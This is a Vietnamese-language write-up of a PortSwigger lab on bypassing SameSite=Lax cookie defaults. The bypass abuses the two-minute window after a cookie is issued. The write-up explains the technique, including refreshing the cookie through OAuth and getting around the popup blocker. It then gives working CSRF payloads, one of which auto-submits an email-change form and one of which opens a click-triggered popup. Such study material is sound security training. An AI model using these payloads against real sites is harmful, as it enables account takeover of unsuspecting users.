# Bypassing SameSite Lax restrictions with newly issued cookies

1. SameSite=Lax là gì? 

- Cookie có *SameSite=Lax* thường **không được gửi** trong **cross-site POST requests** (từ trang web khác). Ví dụ: Nếu bạn ở *evil.com*, cookie của *bank.com* sẽ không được gửi đến *evil.com* khi bạn submit form. 

2. Lỗ hổng với cookie mới tạo (SameSite Lax)

- **Xét trường hợp**: Khi website **không set thuộc tính** *SameSite* cho cookie, Chrome sẽ tự động áp dụng *SameSite=Lax* **nhưng có ngoại lệ**:

    - Trong **2 phút đầu tiên** sau khi cookie được tạo, trình duyệt **vẫn gửi cookie này** trong các yêu cầu POST **cross-site** ở top-level (ví dụ: submit form từ trang khác).

    - **Lý do**: Để tránh phá vỡ các hệ thống đăng nhập SSO (Single Sign-On).

- **Ví dụ**: 
    
    - Bạn login vào *bank.com* --> Cookie được tạo **không có thuộc tính SameSite**.

    - Trong 2 phút đầu, nếu bạn bị dụ vào *evil.com* và submit form POST đến *bank.com*, trình duyệt **vẫn gửi cookie** của *bank.com* --> Tấn công CSRF thành công!

3. Điều khiện để khai thác

- **Cookie phải mới**: Được tạo trong vòng 2 phút.

- **Cookie không được set *SameSite=Lax* rõ ràng**: Chỉ áp dụng khi website **dựa vào mặc định của Chrome** (không khai báo SameSite).

- **Cookie set *SameSite=Lax* rõ ràng**: Không bị ảnh hưởng bởi lỗ hổng này. 

4. Cách hacker mở rộng thời gian tấn công

- **Vấn đề**: 2 phút là thời gian quá ngắn để khai thác.

- **Giải pháp**: Tìm "gadget" (chức năng) trên website khiến nạn nhân **được cấp cookie mới** --> Reset 2 phút. 

- **Ví dụ**: 

    - Chức năng log in qua OAuth (Google, Facebook,...) có thể **tạo session mới mỗi lần log in**, dù user đã log in trước đó. 

    - Hacker dụ nạn nhân log in lại qua OAuth --> Cookie mới được tạo --> Reset 2 phút --> Thực hiện tấn công.

# Bypassing SameSite Lax restrictions with newly issued cookies - Continued

**1. Mục tiêu của hacker**

- **Làm mới cookie** (tạo cookie mới) để **reset 2 phút** mà không cần nạn nhân login lại thủ công. 

- **Redirect nạn nhân về trang của hacker** sau khi cookie được làm mới để thực hiện csrf. 

**2. Cách thực hiện**

**Bước 1: Kích hoạt làm mới cookie bằng "top-level navigation"**

- **Top-level navigation**: Là khi trình duyệt chuyển hướng **toàn bộ trang** sang một URL khác (ví dụ: click link mở trong tab hiện tại).

- **Tại sao cần top-level?**:

    - Cookie có *SameSite=Lax* **được gửi** trong các request top-level (như chuyển trang).

    --> Hacker dụ nạn nhân truy cập trang OAuth (ví dụ: https://vulnerable-website.com/login/sso) qua top-level navigation. 

    --> Trình duyệt gửi cookie hiện tại của nạn nhân đến OAuth --> Nếu OAuth tạo cookie mới, đồng hồ 2 phút bắt đầu lại. 

**Bước 2: Redirect nạn nhân về trang của hacker**

- **Vấn đề**: Sau khi chuyển hướng đến OAuth, nạn nhân ở trang OAuth --> Hacker không thể thực hiện CSRF ngay.

- **Giải pháp**:

    - OAuth sau khi xử lý xong, **redirect nạn nhân về trang hacker** (ví dụ: https://evil.com).

    --> Trang *evil.com* chứa mã độc thực hiện CSRF ngay lập tức. 

**3. Mở trang OAuth trong tab mới để tránh mất quyền kiểm soát**

- **Cách làm**:
    
        // Mở tab mới chứa trang OAuth
        window.open("https://vulnerable-website.com/login/sso"); 

- **Lợi ích**: 

    - Tab gốc (*evil.com*) vẫn mở --> Hacker có thể thực hiện CSRF trong tab này sau khi cookie được làm mới. 

**Vấn đề với popup**:

- Trình duyệt **chặn popup** nếu không được kích hoạt bởi hành động của user (ví dụ: click chuột).

- **Ví dụ**: Code sau sẽ bị chặn: 

        // Popup bị chặn vì không có user interaction
        window.open("https://vulnerable-website.com/login/sso");  

**Cách bypass chặn popup**:

- **Gắn sự kiện** *onclick* vào website để mở popup khi user click (dù click ở đâu): 

        window.onclick = () => {
            window.open("https://vulnerable-website.com/login/sso");
        }  

--> Khi nạn nhân click bất kỳ đâu trên trang *evil.com*, pop mở ra --> Trình duyệt **không chặn** vì có user interaction.


**4. Kịch bản tấn công hoàn chỉnh**

- Nạn nhân truy cập *evil.com*.

- Trang *evil.com* yêu cầu nạn nhân "click để xem ảnh" --> Khi click, mở popup chứa OAuth login.

- Popup OAuth xử lý login và tạo **cookie mới** (reset 2 phút).

- Sau khi popup đóng, *evil.com* gửi yêu cầu CSRF đến *vulnerable-website.com* --> Trình duyệt gửi cookie mới (vì vẫn trong 2 phút).

- Tấn công thành công!

# Lab: SameSite Lax bypass via cookie refresh
![img](https://imgur.com/6qEdzmf.png)

### Web page
![img](https://imgur.com/32LaK3h.png)

### Solution

Thử truy cập My account và log in với account được cấp: 

![img](https://imgur.com/unftGUv.png)

![img](https://imgur.com/paGDvNz.png)

Sau khi nhập username và password: 

![img](https://imgur.com/DiSWpYn.png)

![img](https://imgur.com/RdDl3ue.png)

Thử thay đổi email: 

![img](https://imgur.com/fnBEsAU.png)

Kiểm tra lại change email request trong HTTP history: 

![img](https://imgur.com/sucIy7I.png)

--> Không có unpredictable tokens nào --> có thể tấn công CSRF.

Tiếp tục kiểm tra GET /oauth-callback?code=[...] request ở cuối lòng OAuth, response của request cho thấy website không chỉ định bất kỳ SameSite restrictions nào khi set cookie: 

![img](https://imgur.com/MjoZItu.png)

--> Browser sẽ sử dụng Lax restriction theo mặc định. 

Thử tấn công CSRF, sử dụng lại payload: 

    <script>
        history.pushState('', '', '/')
    </script>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="foo@bar.com" />
        <input type="submit" value="Submit request" />
    </form>
    <script>
        document.forms[0].submit();
    </script>

Go to the exploit server và copy payload vào body: 

![img](https://imgur.com/pmi47fA.png)

Click Store và view the exploit. Điều gì xảy ra tiếp theo phụ thuộc vào thời gian đã trôi qua kể từ khi đăng nhập:

- Nếu lâu hơn 2 phút, nghĩa là sẽ log in thông qua OAuth flow, tấn công thất bại. Trong TH này, lặp lại bước này ngay lập tức. 

- Nếu log in ít hơn 2 phút, tấn công thành công và email được thay đổi. Lúc này, trong HTTP history, tìm POST /my-account/change-email request và xác nhận session cookie được thêm mặc dù đây là cross-site POST request. 

![img](https://imgur.com/AnO9gjh.png)

![img](https://imgur.com/dARdPif.png)

--> Email được đổi thành công. Kiểm tra POST /my-account/change-email request: 

![img](https://imgur.com/gsZ4VVR.png)

--> Xác nhận session cookie vẫn được thêm mặc dù đây là cross-site POST request.

Thử đăng xuất và truy cập /social-login: 

![img](https://imgur.com/ZLr2cpm.png)

![img](https://imgur.com/FjhF94O.png)

![img](https://imgur.com/S0L7Oum.png)

--> Vẫn có thể log in mà không cần bất kỳ tương tác nào. Để ý sau mỗi lần hoàn thành OAuth flow, target site sẽ set session cookie mới ngay cả khi đã login. 

Thay đổi payload để cuộc tấn công trước tiên sẽ làm mới session của nạn nhân bằng cách buộc trình duyệt của họ truy cập /social-login, sau đó gửi change email request sau 1 short pause:

    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="pwned@web-security-academy.net">
    </form>
    <script>
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);

        function changeEmail(){
            document.forms[0].submit();
        }
    </script>

Lưu ý , mở /social-login trong một cửa sổ mới để tránh điều hướng khỏi khai thác trước khi change email request được gửi.

![img](https://imgur.com/gPgCnr3.png)

Store và View exploit. Quan sát thấy request ban đầu bị chặn bởi browser's popup blocker:

![img](https://imgur.com/lwg6oxj.png)

Có thể thấy popup đang bị chặn vì chưa tương tác gì với page.

Điều chỉnh payload để khiến nạn nhân click vào page và chỉ mở popup khi user đã click: 

    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="pwned@portswigger.net">
    </form>
    <p>Click anywhere on the page</p>
    <script>
        window.onclick = () => {
            window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
            setTimeout(changeEmail, 5000);
        }

        function changeEmail() {
            document.forms[0].submit();
        }
    </script>

![img](https://imgur.com/7fYjJz2.png)

![img](https://imgur.com/Xa2Jg4E.png)

Popup mới hiển thị: 

![img](https://imgur.com/z1gFxSi.png)

![img](https://imgur.com/V78cNvo.png)

Email được thay đổi: 

![img](https://imgur.com/5Q22Nt9.png)

Thay đổi 1 email khác trong payload và Deliver exploit to victim. 

Solved the lab!

![img](https://imgur.com/NPbqWjP.png)